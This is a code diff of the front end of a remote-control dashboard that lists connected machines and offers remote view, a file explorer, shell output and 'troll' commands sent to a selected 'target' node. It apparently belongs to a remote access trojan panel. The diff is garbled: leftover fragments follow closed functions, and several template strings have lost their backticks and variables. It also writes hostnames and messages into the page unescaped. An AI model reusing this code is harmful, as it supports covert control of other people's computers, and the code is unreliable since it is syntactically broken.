@@ -198,7 +198,7 @@ function handleMsg(d) {
 					_closeRemote();
 				}
 			}
-			if ($("statActiveNodes")) $("statActiveNodes").textContent = on;
+			updateTopBarStats({nodes_online: on});
 			if ($("statTotalNodes"))
 				$("statTotalNodes").textContent = currentNodes.length;
 			if ($("liveCount")) $("liveCount").textContent = `${on} Online`;
@@ -727,13 +727,62 @@ function _showView(v) {
 
 // â”€â”€ NODE RENDERING â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function renderNodes() {
-	const grid = $("nodeGrid");
+	const grid = document.getElementById("nodeGrid");
 	if (!grid) return;
 	if (!currentNodes.length) {
-		grid.innerHTML =
-			'<div style="grid-column:1/-1;text-align:center;padding:4rem;color:var(--text-3);font-size:.88rem">No nodes connected</div>';
+		grid.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:4rem;color:var(--text-3);font-size:.88rem">Awaiting neural link...</div>';
 		return;
 	}
+	grid.innerHTML = "";
+	currentNodes.forEach((n) => {
+		const s = n.specs || n;
+		const active = n.status === "Online";
+		const el = document.createElement("div");
+		el.className = "node-card fade-in";
+		
+		const flag = s.flag || "🏳️";
+		const region = s.region || s.country || "Unknown";
+		const displayId = s.hostname || n.id;
+		const osIcon = s.os?.toLowerCase().includes("win") ? "🪟" : "🐧";
+
+		el.innerHTML = `
+			<div class="node-card-header">
+				<div class="node-info">
+					<div class="node-status">
+						<div class="stat-dot ${active ? "active" : "error"}"></div>
+						${active ? "Online" : "Offline"}
+					</div>
+					<div class="node-name">${displayId}</div>
+					<div style="font-size:0.65rem; color:var(--text-3)">${flag} ${region}</div>
+				</div>
+				<div style="font-size:1.5rem">${osIcon}</div>
+			</div>
+			<div class="node-specs">
+				<div class="spec-item">
+					<div class="spec-label">CPU</div>
+					<div class="spec-value" id="node-cpu-${n.id}">${n.lastCpu != null ? Math.round(n.lastCpu) + "%" : "—"}</div>
+				</div>
+				<div class="spec-item">
+					<div class="spec-label">RAM</div>
+					<div class="spec-value" id="node-ram-${n.id}">${n.lastRam != null ? Math.round(n.lastRam) + "%" : "—"}</div>
+				</div>
+				<div class="spec-item">
+					<div class="spec-label">Displays</div>
+					<div class="spec-value">${s.monitors || 1}</div>
+				</div>
+				<div class="spec-item">
+					<div class="spec-label">GPU</div>
+					<div class="spec-value">${s.gpu_model || "—"}</div>
+				</div>
+			</div>
+			<div class="node-actions">
+				<button class="btn-card primary" onclick="openRemote('${n.id}', ${JSON.stringify(n).replace(/"/g, '&quot;')})">Connect</button>
+				<button class="btn-card" onclick="openFileExplorer('${n.id}', 'C:\\')">Files</button>
+			</div>
+		`;
+		grid.appendChild(el);
+	});
+}
 	grid.innerHTML = "";
 	grid.classList.add("stagger-in"); // Add animation class
 	renderMapPins();
@@ -2545,18 +2594,19 @@ function _appendShellOutput(txt) {
 // â”€â”€ LOGS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 function logEvent(msg, type = "info") {
-	const el = $("eventLogStream");
-	if (!el) return;
-	const t = new Date().toLocaleTimeString();
-	const cls =
-		type === "ok"
-			? "log-ok"
-			: type === "warn"
-				? "log-warn"
-				: type === "err"
-					? "log-err"
-					: "log-info";
-	el.innerHTML += `<div class="${cls}">[${t}] ${msg}</div>`;
+	const consoleLogs = document.getElementById("consoleLogs");
+	if (!consoleLogs) {
+		console.log(`[${type}] ${msg}`);
+		return;
+	}
+	const line = document.createElement("div");
+	line.className = `log-line log-${type}`;
+	const time = new Date().toLocaleTimeString();
+	line.innerHTML = `<span class="log-time">[${time}]</span><span class="log-tag">${type.toUpperCase()}</span><span class="log-msg">${msg}</span>`;
+	consoleLogs.appendChild(line);
+	consoleLogs.scrollTop = consoleLogs.scrollHeight;
+	if (consoleLogs.childElementCount > 100) consoleLogs.removeChild(consoleLogs.firstChild);
+}">[${t}] ${msg}</div>`;
 	el.scrollTop = el.scrollTopMax || el.scrollHeight;
 }
 // ── DUAL AUDIO ENGINE ──
@@ -4767,3 +4817,51 @@ window.setStreamFps = _setStreamFps;
 window.togglePanel = _togglePanel;
 window.toggleFullscreen = _toggleFullscreen;
 window.setQuality = _setQuality;
+function switchRemoteTab(tab) {
+	document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
+	event.target.classList.add("active");
+	logEvent(`Switching to ${tab} view`, "info");
+    
+    // Hide all tab content
+    document.querySelectorAll(".tab-content").forEach(c => c.style.display = "none");
+    
+    // Show selected tab content
+    const target = document.getElementById(`remote-${tab}`);
+    if (target) target.style.display = "block";
+    else {
+        // Fallback for unimplemented tabs
+        const content = document.getElementById("remoteContent");
+        content.innerHTML = `<div style="padding:4rem; text-align:center; color:var(--text-3)">${tab.toUpperCase()} module initialization in progress...</div>`;
+    }
+}
+
+// Update Top Bar Stats
+function updateTopBarStats(s) {
+    if (s.cpu_pct !== undefined && document.getElementById("statServerLoad")) {
+        document.getElementById("statServerLoad").textContent = s.cpu_pct.toFixed(1) + "%";
+    }
+    if (s.nodes_online !== undefined && document.getElementById("statActiveNodes")) {
+        document.getElementById("statActiveNodes").textContent = s.nodes_online;
+    }
+}
+// Uptime Counter
+let startTime = Date.now();
+setInterval(() => {
+    const uptimeEl = document.getElementById("uptimeCounter");
+    if (!uptimeEl) return;
+    const diff = Math.floor((Date.now() - startTime) / 1000);
+    const h = Math.floor(diff / 3600).toString().padStart(2, '0');
+    const m = Math.floor((diff % 3600) / 60).toString().padStart(2, '0');
+    const s = (diff % 60).toString().padStart(2, '0');
+    uptimeEl.textContent = ${h}::;
+}, 1000);
+function execTroll(type) {
+    if (!currentTargetId) {
+        logEvent("No active node selected for command.", "error");
+        return;
+    }
+    logEvent(Executing  on node , "warning");
+    if (socket?.readyState === WebSocket.OPEN) {
+        socket.send(JSON.stringify({ type: "troll", cmd: type, id: currentTargetId }));
+    }
+}
